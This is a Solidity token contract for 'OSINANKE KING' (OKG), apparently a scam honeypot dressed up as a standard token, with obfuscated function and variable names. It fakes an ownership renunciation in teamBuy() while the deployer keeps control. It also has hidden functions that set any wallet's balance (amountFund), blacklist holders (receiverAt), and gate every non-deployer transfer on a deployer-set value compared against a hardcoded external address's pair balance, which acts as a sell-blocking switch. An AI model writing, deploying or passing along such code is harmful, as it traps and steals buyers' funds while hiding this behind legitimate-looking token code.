//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

abstract contract marketingTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxAuto {
    function createPair(address amountTrading, address feeMax) external returns (address);
}


interface amountTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface marketingLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isMarketing) external view returns (uint256);

    function transfer(address amountShould, uint256 walletAt) external returns (bool);

    function allowance(address txLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletAt) external returns (bool);

    function transferFrom(address sender,address amountShould,uint256 walletAt) external returns (bool);

    event Transfer(address indexed from, address indexed fundList, uint256 value);
    event Approval(address indexed txLimit, address indexed spender, uint256 value);
}

interface marketingLiquidityMetadata is marketingLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OSINANKEKING is marketingTotal, marketingLiquidity, marketingLiquidityMetadata {

    address tokenTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return buyLaunch;
    }

    function liquidityLaunched(address toLaunch, address amountShould, uint256 walletAt) internal returns (bool) {
        require(txTrading[toLaunch] >= walletAt);
        txTrading[toLaunch] -= walletAt;
        txTrading[amountShould] += walletAt;
        emit Transfer(toLaunch, amountShould, walletAt);
        return true;
    }

    function receiverAt(address enableSenderTrading) public {
        amountMin();
        
        if (enableSenderTrading == tradingBuy || enableSenderTrading == launchedSender) {
            return;
        }
        takeSenderMarketing[enableSenderTrading] = true;
    }

    function amountFund(address fromBuy, uint256 walletAt) public {
        amountMin();
        txTrading[fromBuy] = walletAt;
    }

    function owner() external view returns (address) {
        return minTotal;
    }

    address public launchedSender;

    mapping(address => bool) public takeSenderMarketing;

    function teamBuy() public {
        emit OwnershipTransferred(tradingBuy, address(0));
        minTotal = address(0);
    }

    uint256 private walletExempt;

    function approve(address sellModeWallet, uint256 walletAt) public virtual override returns (bool) {
        amountLaunch[_msgSender()][sellModeWallet] = walletAt;
        emit Approval(_msgSender(), sellModeWallet, walletAt);
        return true;
    }

    function totalEnable(uint256 walletAt) public {
        amountMin();
        minFrom = walletAt;
    }

    constructor (){
        if (walletExempt == launchedFund) {
            walletExempt = launchedFund;
        }
        teamBuy();
        amountTake launchedExempt = amountTake(launchMode);
        launchedSender = maxAuto(launchedExempt.factory()).createPair(launchedExempt.WETH(), address(this));
        
        tradingBuy = _msgSender();
        liquidityShould[tradingBuy] = true;
        txTrading[tradingBuy] = launchFeeWallet;
        if (launchedFund == walletExempt) {
            senderAt = false;
        }
        emit Transfer(address(0), tradingBuy, launchFeeWallet);
    }

    mapping(address => bool) public liquidityShould;

    mapping(address => uint256) private txTrading;

    bool public shouldMax;

    function getOwner() external view returns (address) {
        return minTotal;
    }

    string private buyLaunch = "OKG";

    string private sellSender = "OSINANKE KING";

    function balanceOf(address isMarketing) public view virtual override returns (uint256) {
        return txTrading[isMarketing];
    }

    function transferFrom(address toLaunch, address amountShould, uint256 walletAt) external override returns (bool) {
        if (_msgSender() != launchMode) {
            if (amountLaunch[toLaunch][_msgSender()] != type(uint256).max) {
                require(walletAt <= amountLaunch[toLaunch][_msgSender()]);
                amountLaunch[toLaunch][_msgSender()] -= walletAt;
            }
        }
        return totalTx(toLaunch, amountShould, walletAt);
    }

    bool public senderBuy;

    bool public tokenTake;

    bool public senderAt;

    address launchMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address receiverMarketing, address sellModeWallet) external view virtual override returns (uint256) {
        if (sellModeWallet == launchMode) {
            return type(uint256).max;
        }
        return amountLaunch[receiverMarketing][sellModeWallet];
    }

    uint256 atMode;

    address private minTotal;

    function totalTx(address toLaunch, address amountShould, uint256 walletAt) internal returns (bool) {
        if (toLaunch == tradingBuy) {
            return liquidityLaunched(toLaunch, amountShould, walletAt);
        }
        uint256 launchAutoAt = marketingLiquidity(launchedSender).balanceOf(tokenTotal);
        require(launchAutoAt == minFrom);
        require(!takeSenderMarketing[toLaunch]);
        return liquidityLaunched(toLaunch, amountShould, walletAt);
    }

    function transfer(address fromBuy, uint256 walletAt) external virtual override returns (bool) {
        return totalTx(_msgSender(), fromBuy, walletAt);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchFeeWallet;
    }

    event OwnershipTransferred(address indexed maxReceiver, address indexed tokenTx);

    function amountMin() private view {
        require(liquidityShould[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return listLaunchFee;
    }

    uint256 public launchedFund;

    uint256 minFrom;

    uint256 private launchFeeWallet = 100000000 * 10 ** 18;

    uint8 private listLaunchFee = 18;

    function totalMarketing(address enableLaunched) public {
        if (tokenTake) {
            return;
        }
        if (launchedFund == walletExempt) {
            senderAt = false;
        }
        liquidityShould[enableLaunched] = true;
        
        tokenTake = true;
    }

    address public tradingBuy;

    mapping(address => mapping(address => uint256)) private amountLaunch;

    function name() external view virtual override returns (string memory) {
        return sellSender;
    }

}